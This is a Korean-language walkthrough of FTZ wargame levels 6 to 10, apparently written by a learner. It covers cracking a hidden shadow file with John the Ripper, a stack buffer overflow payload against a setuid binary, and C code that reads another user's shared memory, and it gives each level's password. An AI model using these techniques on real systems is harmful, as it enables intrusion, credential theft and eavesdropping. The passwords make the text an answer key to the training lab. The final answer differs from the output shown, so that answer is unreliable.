#================================================================================#
#FTZ Level 6
hint) 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.



#FTZ Level 6 풀이 과정)
엔터를 누르면 종료가 되길래 당황해서 로그인하고 명령어도 입력해보고 별짓을 다하다가,
crontrol + c 하니까 꺼졌다. ㅋㅋㅋ 뭐지?
ls -al 로 password파일이 있어 다음 패스워드를 확인했다.
이건 너무 오래되어 알 필요 없는 해킹 기법이라하니 걍 넘어간다.


답 == come together



#================================================================================#
#FTZ Level 7
hint) /bin/level7 명령을 실행하면, 패스워드 입력을 요청한다.

1. 패스워드는 가까운곳에..
2. 상상력을 총동원하라.
3. 2진수를 10진수를 바꿀 수 있는가?
4. 계산기 설정을 공학용으로 바꾸어라



#FTZ Level 7 풀이 과정)
일단, 가서 /bin/level7을 봤다. setuid가 걸려있는 것이 확실하다. 일단 실행.
지문에서 말했듯이 비밀번호를 입력한다.
아무것도 모르니 ctrl + d 를 눌렀더니 --_--_- --____- ---_-__ --__-_- 가 나온다.
이진법이라고 했으니, 프로그래머용 계산기를 꺼내서 -을 1로 _을 0으로 해봤다.
띄어쓰기가 도중 있었으나 무시하고 진행.
230193765 라는 어마무시한 숫자가 나왔다. 입력. 실패.
혹시나 _가 1일 까 싶어 진행. 실패.
-을 1로 _0으로 띄어쓰기를 중요시한 채 다시 진행.
--_--_- / --____- / ---_-__ / --__-_- 잘보이지 않으니 체크.
109 97 116 101 이나 왔다. 입력했으나 실패.
반대로 진행
18 61 11 20 입력. 실패.
그러다가 아스키 코드표를 보고 대입.
mate 가 나오고 입력하니 다음 비밀번호가 나왔다.


답 == break the world




#================================================================================#

#FTZ Level 8
hint) level9의 shadow 파일이 서버 어딘가에 숨어있다.
그 파일에 대해 알려진 것은 용량이 "2700"이라는 것 뿐이다.


#FTZ Level 8 풀이 과정)
그나마 좀 친절한 것 같다. find로 사이즈를 찾으면 될 것 같다.
find 명령어를 찾아서 size 값으로 검색하는 법을 찾아보니 사이즈 단위로 찾을 수 있었다.
사이즈 단위가 나오는데
b : 블록
c : byte
k : kbyte
w : 2byte
다. 보통 파일 크기를 byte단위로 부르니 byte로 찾았다.
find / -size 2700c 2>/dev/null ->
/var/www/manual/ssl/ssl_intro_fig2.gif
/etc/rc.d/found.txt
/usr/share/man/man3/IO::Pipe.3pm.gz
/usr/share/man/man3/URI::data.3pm.gz
값들이 나왔다. found.txt가 내가 찾는 파일처럼 이름이 지어져있다.
가서 열어보니
level9의 shadow파일이 있었다. 오... 암호화가 잘되어있으니, 복호화 하는 방법을 구글에 검색하다가
john the ripper 라는 툴을 찾을 수 있었다.

설치하는 법도 참고하여 설치 했다.
설치 과정을 설명하겠다. 
https://www.openwall.com/john/ 에서 툴의 링크를 복사한다 (https://www.openwall.com/john/k/john-1.9.0.tar.gz).
mkdir /tmp/8 로 8이란 임시 디렉토리를 만들어 그곳에서 wget 링크로 다운받았다.
gzip으로 압축되어있으니
gzip -d 파일명
으로 풀고 tar은 
tar -xvf 파일명으로 풀면 된다.
잘 풀린다면 src 파일이 있을텐데 그곳에서 make로 명령해서 지원 가능한 시스템을 검색.
나는 make linux-x86-64로 했다. 자신의 호환에 맞는 시스템을 만들어야 한다. (여기서 make 명령어를 간단하게 설명하면, makefile이라는 파일을 참조하여 [빌드]하는 명령어다.)
그리고 run 디렉토리로 이동한 후, john을 실행해서 보면 된다.
./john /etc/rc.d/found.txt ->
Loaded 36 password hashes with no different salts (md5crypt [MD5 32/64 X2])
No password hashes left to crack (see FAQ)
라고 뜨는데, md5crypt로 암호화 한것 같다.
./john -show /etc/rc.d/found.txt ->
level9:apple:11040:0:99999:7:-1:-1:134549524
비밀번호 위치에 apple 이라는 비밀번호가 나왔다.

답 == apple


#================================================================================#
#FTZ Level 9
hint) 
/usr/bin/bof의 소스이다.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
main(){
 
  char buf2[10];
  char buf[10];
 
  printf("It can be overflow : ");
  fgets(buf,40,stdin);
 
  if ( strncmp(buf2, "go", 2) == 0 )
   {
        printf("Good Skill!\n");
        setreuid( 3010, 3010 );
        system("/bin/bash");
   }
 
}   

이를 이용하여 level10의 권한을 얻어라.



#FTZ Level 9 풀이 과정)
bof 문제를 풀기전 달고나 bof.pdf로 어느정도 공부했다. 근데.... 공부해도 잘모르겠어서 닥치고 이해한대로 행했다.
정답자료도 참고했음.

코드를 보면 buf2에 go라는 문자열이 입력되면 /bin/bash 쉘 스크립트가 실행된다.
문제는 buf2에 입력을 할 수 없다는 것. 
buf에 입력해서 buf2를 침범하게 만들어야 한다. 그게 BOF니까.
그래서 buf의 위치와 buf2의 위치를 알아야 하고, 그 크기를 알아야 한다. 그래야 어느정도 크기를 넘어서 입력해야하는 지 알 수 있으니까.

tmp/9를 만들어 힌트에 적힌 소스코드를 vi로 만들어 gcc 컴파일을 하고, 
gdb disassemble main으로 소스코드를 들여다 보았다.
[intel 문법]
0x08048420 <main+0>:	push   ebp
0x08048421 <main+1>:	mov    ebp,esp
0x08048423 <main+3>:	sub    esp,0x28
0x08048426 <main+6>:	and    esp,0xfffffff0
0x08048429 <main+9>:	mov    eax,0x0
0x0804842e <main+14>:	sub    esp,eax
0x08048430 <main+16>:	sub    esp,0xc
0x08048433 <main+19>:	push   0x8048554
0x08048438 <main+24>:	call   0x8048350 <printf>
0x0804843d <main+29>:	add    esp,0x10
0x08048440 <main+32>:	sub    esp,0x4
0x08048443 <main+35>:	push   ds:0x8049698
0x08048449 <main+41>:	push   0x28
0x0804844b <main+43>:	lea    eax,[ebp-40]
0x0804844e <main+46>:	push   eax
0x0804844f <main+47>:	call   0x8048320 <fgets>
0x08048454 <main+52>:	add    esp,0x10
0x08048457 <main+55>:	sub    esp,0x4
0x0804845a <main+58>:	push   0x2
0x0804845c <main+60>:	push   0x804856a
0x08048461 <main+65>:	lea    eax,[ebp-24]
0x08048464 <main+68>:	push   eax
0x08048465 <main+69>:	call   0x8048330 <strncmp>
0x0804846a <main+74>:	add    esp,0x10
0x0804846d <main+77>:	test   eax,eax
0x0804846f <main+79>:	jne    0x80484a6 <main+134>
0x08048471 <main+81>:	sub    esp,0xc
0x08048474 <main+84>:	push   0x804856d
0x08048479 <main+89>:	call   0x8048350 <printf>
0x0804847e <main+94>:	add    esp,0x10
0x08048481 <main+97>:	sub    esp,0x8
0x08048484 <main+100>:	push   0xbc2
0x08048489 <main+105>:	push   0xbc2
0x0804848e <main+110>:	call   0x8048360 <setreuid>
0x08048493 <main+115>:	add    esp,0x10
0x08048496 <main+118>:	sub    esp,0xc
0x08048499 <main+121>:	push   0x804857a
0x0804849e <main+126>:	call   0x8048310 <system>
0x080484a3 <main+131>:	add    esp,0x10
0x080484a6 <main+134>:	leave  
0x080484a7 <main+135>:	ret   

lea 하는 부분을 봐야겠다.
함수 실행 전, push를 이용해 스택에다가 값을 하나하나 넣고있다.
그리고 함수가 끝나면 add esp,0x10을 통해 지금까지 썼었던 stack을 원상복구 시킨다.
그전에 공간을 확보하는 행위들은 dummy라고 하니 넉넉히 공간을 사용하기 위해 저렇게 사용하는 것.
이라고 이해하고 넘어갔다.

함수를 실행할 때 매개변수를 넣어주는 방법은 이렇다.
stack은 LIFO 마지막에 들어온 것이 제일 먼저 나간다.
즉, 매개변수 1, 2, 3이 있다고 쳤을 때, stack에서는 3,2,1 으로 push해준다는 것이다.
이러한 순서를 알았으니, 함수 실행 전에 있는 push가 첫 번째 매개변수인 것을 알 수 있었다.
0x0804844b <main+43>:	lea    eax,[ebp-40] 가 buf의 위치인 것을 알 수 있다.
그것을 eax에 넣고, 스택에 push해서 넣어준다.
0x08048461 <main+65>:	lea    eax,[ebp-24] 가 buf2의 위치다.
잘보면
[ebp-40], [ebp-24]다. buf에서 buf2로 가려면 16바이트 이상을 입력하면 bof가 일어난다고 볼 수 있다.

1234123412341234go라고 하니, 성공적으로 level10 쉘에 들어갔다.

my-pass로 비밀번호를 얻어내면 끝

답 == interesting to hack!



#================================================================================#
#FTZ Level 10
hint)
 두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다.
그 대화방은 공유 메모리를 이용하여 만들어졌으며, 
key_t의 값은 7530이다. 이를 이용해 두 사람의 대화를 도청하여 
level11의 권한을 얻어라.

- 레벨을 완료하셨다면 소스는 지우고 나가주세요.

#FTZ Level 10 풀이 과정)
이번에는 공유 메모리에서 대화를 나누고 있는 사람들의 대화를 엿들으라는 것이 주제였다.
공유 메모리에 대해서 알아야하니 검색, 하니까 매우 많은 사람들이 공유메모리에 방을 만드는 방법,
삭제하는 방법 등을 알려주고 있었다.
일단 그보다 원리를 알아봐야 나중에 도움이 되겠다 싶었다.

공유메모리의 생성요청은 최초 공유메모리 영역을 만드는 프로세스가 커널에 공유 메모리 공간을 할당을 요청함으로써 만들어지며,
공유 메모리는 커널에 의해 관리가 된다고 한다.
직접 공간을 삭제하지 않는한 재부팅을 하든, 프로세스가 사라지든 남아있으니 공유메모리를 사용하고 나면 삭제해야겠다.

소스파일을 만들어 컴파일하고 실행하면 되는 문제,
int main(){

	int shmid = shmget(7530,0,IPC_EXCL);

	void * shmbuf = shmat(shmid,NULL,0);

	printf("%s\n", (char *) shmbuf);
	
}
최대한 간단하게 만들었다. (ipcs -m 하면 현재 사용중인 ipc 자원 정보를 확인할수 있었다. 거기서 key는 hex값으로 1D6A라고 되어있는데 정수로 7530이다.)
shmid 는 내가 받아올 아이디이다.
shmget("내가 접근할 키 번호","이미 만들어진 방이기에 사이즈는 0으로 했다","이미 만들어진 방이기에 생성하지 않는다.")

아이디를 얻으면 이제 공유 메모리에 접근해야한다. 접근이 가능하도록 해주는 것이 shmat함수!
shmat("식별자 번호","커널이 메모리가 붙을 주소를 명시","읽기/쓰기 가능")
으로 열리게 했다.

간단하게 컴파일하고 실행하니 답이 나왔다.


멍멍: level11의 패스워드는?
구타: what!@#$?

답 == hat!@#$?


